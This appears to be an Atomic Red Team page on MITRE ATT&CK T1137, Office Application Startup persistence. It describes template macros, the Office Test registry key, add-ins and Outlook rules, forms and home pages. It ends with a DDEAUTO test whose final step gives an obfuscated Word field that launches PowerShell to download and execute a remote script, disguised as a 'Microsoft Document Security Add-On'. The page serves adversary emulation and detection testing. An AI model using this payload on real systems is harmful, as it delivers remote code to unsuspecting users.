<div class="Box-body readme blob instapaper_body js-code-block-container" id="readme">
    <article class="markdown-body entry-content p-3 p-md-6" itemprop="text"><h1><a aria-hidden="true" class="anchor" href="#t1137---office-application-startup" id="user-content-t1137---office-application-startup"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>T1137 - Office Application Startup</h1>
<h2><a aria-hidden="true" class="anchor" href="#description-from-attck" id="user-content-description-from-attck"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a><a href="https://attack.mitre.org/wiki/Technique/T1137" rel="nofollow">Description from ATT&amp;CK</a></h2>
<blockquote>Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started.
<h3><a aria-hidden="true" class="anchor" href="#office-template-macros" id="user-content-office-template-macros"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Office Template Macros</h3>
<p>Microsoft Office contains templates that are part of common Office applications and are used to customize styles. The base templates within the application are used each time an application starts. (Citation: Microsoft Change Normal Template)</p>
<p>Office Visual Basic for Applications (VBA) macros (Citation: MSDN VBA in Office) can inserted into the base templated and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded. (Citation: enigma0x3 normal.dotm) (Citation: Hexacorn Office Template Macros)</p>
<p>Word Normal.dotm location:<code>C:\Users(username)\AppData\Roaming\Microsoft\Templates\Normal.dotm</code></p>
<p>Excel Personal.xlsb location:<code>C:\Users(username)\AppData\Roaming\Microsoft\Excel\XLSTART\PERSONAL.XLSB</code></p>
<p>An adversary may need to enable macros to execute unrestricted depending on the system or enterprise security policy on use of macros.</p>
<h3><a aria-hidden="true" class="anchor" href="#office-test" id="user-content-office-test"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Office Test</h3>
<p>A Registry location was found that when a DLL reference was placed within it the corresponding DLL pointed to by the binary path would be executed every time an Office application is started (Citation: Hexacorn Office Test)</p>
<p><code>HKEY_CURRENT_USER\Software\Microsoft\Office test\Special\Perf</code></p>
<h3><a aria-hidden="true" class="anchor" href="#add-ins" id="user-content-add-ins"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Add-ins</h3>
<p>Office add-ins can be used to add functionality to Office programs. (Citation: Microsoft Office Add-ins)</p>
<p>Add-ins can also be used to obtain persistence because they can be set to execute code when an Office application starts. There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)</p>
<h3><a aria-hidden="true" class="anchor" href="#outlook-rules-forms-and-home-page" id="user-content-outlook-rules-forms-and-home-page"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Outlook Rules, Forms, and Home Page</h3>
<p>A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub)</p>
<p>Outlook rules allow a user to define automated behavior to manage email messages. A benign rule might, for example, automatically move an email to a particular folder in Outlook if it contains specific words from a specific sender. Malicious Outlook rules can be created that can trigger code execution when an adversary sends a specifically crafted email to that user.(Citation: SilentBreak Outlook Rules)</p>
<p>Outlook forms are used as templates for presentation and functionality in Outlook messages. Custom Outlook Forms can be created that will execute code when a specifically crafted email is sent by an adversary utilizing the same custom Outlook form.(Citation: SensePost Outlook Forms)</p>
<p>Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)</p>
<p>To abuse these features, an adversary requires prior access to the user’s Outlook mailbox, either via an Exchange/OWA server or via the client application. Once malicious rules, forms, or Home Pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded while malicious rules and forms will execute when an adversary sends a specifically crafted email to the user.(Citation: SilentBreak Outlook Rules)(Citation: SensePost Outlook Forms)(Citation: SensePost Outlook Home Page)</p></blockquote><p></p>
<h2><a aria-hidden="true" class="anchor" href="#atomic-tests" id="user-content-atomic-tests"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Atomic Tests</h2>
<ul>
<li><a href="#atomic-test-1---ddeauto">Atomic Test #1 - DDEAUTO</a></li>
</ul>
<br/>
<h2><a aria-hidden="true" class="anchor" href="#atomic-test-1---ddeauto" id="user-content-atomic-test-1---ddeauto"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Atomic Test #1 - DDEAUTO</h2>
<p>TrustedSec - Unicorn - <a href="https://github.com/trustedsec/unicorn">https://github.com/trustedsec/unicorn</a></p>
<p>SensePost DDEAUTO - <a href="https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/" rel="nofollow">https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/</a></p>
<p>Word VBA Macro</p>
<p><a href="https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail">Dragon's Tail</a></p>
<p><strong>Supported Platforms:</strong> Windows</p>
<h4><a aria-hidden="true" class="anchor" href="#run-it-with-these-steps" id="user-content-run-it-with-these-steps"><svg aria-hidden="true" class="octicon octicon-link" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z" fill-rule="evenodd"></path></svg></a>Run it with these steps!</h4>
<ol>
<li>
<p>Open Word</p>
</li>
<li>
<p>Insert tab -&gt; Quick Parts -&gt; Field</p>
</li>
<li>
<p>Choose = (Formula) and click ok.</p>
</li>
<li>
<p>Once the field is inserted, you should now see "!Unexpected End of Formula"</p>
</li>
<li>
<p>Right-click the Field, choose "Toggle Field Codes"</p>
</li>
<li>
<p>Paste in the code from Unicorn or SensePost</p>
</li>
<li>
<p>Save the Word document.</p>
</li>
<li>
<p>DDEAUTO c:\windows\system32\cmd.exe "/k calc.exe"</p>
</li>
<li>
<p>DDEAUTO "C:\Programs\Microsoft\Office\MSWord\..\..\..\..\windows\system32\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\v1.0\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http:///download.ps1'); # " "Microsoft Document Security Add-On"</p>
</li>
</ol>
<br/>
</article>
  </div>